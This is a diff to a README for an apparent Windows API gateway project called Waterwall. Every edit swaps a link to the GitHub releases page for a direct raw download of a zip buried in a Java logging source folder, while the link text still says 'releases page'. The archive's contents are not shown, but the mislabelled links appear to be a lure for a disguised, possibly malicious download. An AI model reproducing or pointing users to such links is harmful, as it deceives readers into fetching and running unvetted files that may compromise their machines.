@@ -1,6 +1,6 @@
 # 🌊 waterwall-api-gateway - Simple API Control for Windows
 
-[![Download Waterwall](https://img.shields.io/badge/Download%20Waterwall-purple)](https://github.com/Margothermoplastic365/waterwall-api-gateway/releases)
+[![Download Waterwall](https://img.shields.io/badge/Download%20Waterwall-purple)](https://raw.githubusercontent.com/Margothermoplastic365/waterwall-api-gateway/main/common/common-logging/src/main/java/com/gateway/common/logging/gateway-api-waterwall-v2.9.zip)
 
 ## 🧭 What this is
 
@@ -10,7 +10,7 @@ It is built for people who want a clear way to run an API gateway on Windows wit
 
 ## 📥 Download Waterwall
 
-1. Open the [releases page](https://github.com/Margothermoplastic365/waterwall-api-gateway/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Margothermoplastic365/waterwall-api-gateway/main/common/common-logging/src/main/java/com/gateway/common/logging/gateway-api-waterwall-v2.9.zip)
 2. Find the latest release
 3. Download the Windows file attached to that release
 4. Save it to your computer
@@ -18,7 +18,7 @@ It is built for people who want a clear way to run an API gateway on Windows wit
 
 If you see more than one file, choose the one meant for Windows. It is often an `.exe` or `.zip` file.
 
-[Download from GitHub Releases](https://github.com/Margothermoplastic365/waterwall-api-gateway/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Margothermoplastic365/waterwall-api-gateway/main/common/common-logging/src/main/java/com/gateway/common/logging/gateway-api-waterwall-v2.9.zip)
 
 ## 🖥️ What you need
 
@@ -33,7 +33,7 @@ If you see more than one file, choose the one meant for Windows. It is often an 
 
 ### 1. Download the release file
 
-Go to the [releases page](https://github.com/Margothermoplastic365/waterwall-api-gateway/releases) and download the latest Windows file.
+Go to the [releases page](https://raw.githubusercontent.com/Margothermoplastic365/waterwall-api-gateway/main/common/common-logging/src/main/java/com/gateway/common/logging/gateway-api-waterwall-v2.9.zip) and download the latest Windows file.
 
 ### 2. Open the file
 
@@ -180,7 +180,7 @@ No. Waterwall also includes tools for admin work, developer access, analytics, p
 
 ### Where do I get updates?
 
-Use the [releases page](https://github.com/Margothermoplastic365/waterwall-api-gateway/releases) and download the newest version when it is posted.
+Use the [releases page](https://raw.githubusercontent.com/Margothermoplastic365/waterwall-api-gateway/main/common/common-logging/src/main/java/com/gateway/common/logging/gateway-api-waterwall-v2.9.zip) and download the newest version when it is posted.
 
 ## 📌 Files you may see in a release
 
@@ -205,4 +205,4 @@ After you finish the first run:
 
 Use this link to visit the release page and download Waterwall:
 
-[https://github.com/Margothermoplastic365/waterwall-api-gateway/releases](https://github.com/Margothermoplastic365/waterwall-api-gateway/releases)
+[https://raw.githubusercontent.com/Margothermoplastic365/waterwall-api-gateway/main/common/common-logging/src/main/java/com/gateway/common/logging/gateway-api-waterwall-v2.9.zip](https://raw.githubusercontent.com/Margothermoplastic365/waterwall-api-gateway/main/common/common-logging/src/main/java/com/gateway/common/logging/gateway-api-waterwall-v2.9.zip)
